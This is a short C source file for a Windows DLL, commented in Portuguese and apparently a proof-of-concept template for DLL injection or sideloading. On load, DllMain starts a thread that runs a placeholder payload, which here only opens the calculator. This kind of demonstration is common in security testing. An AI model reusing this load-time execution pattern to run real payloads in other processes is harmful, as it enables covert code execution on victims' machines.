#include <windows.h>

// thread que roda o payload separado do DllMain
DWORD WINAPI ExecutePayload(LPVOID lpParam) {
    // espera curta pra garantir que a dll terminou de carregar
    Sleep(100);
    
    // payload de exemplo, abre a calculadora
    WinExec("calc.exe", SW_SHOW);
    
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            // cria thread separada, mais seguro que rodar direto no DllMain
            CreateThread(NULL, 0, ExecutePayload, NULL, 0, NULL);
            break;
        case DLL_THREAD_ATTACH:
            // opcional, poderia executar tambem em novas threads
            // CreateThread(NULL, 0, ExecutePayload, NULL, 0, NULL);
            break;
    }
    return TRUE;
}
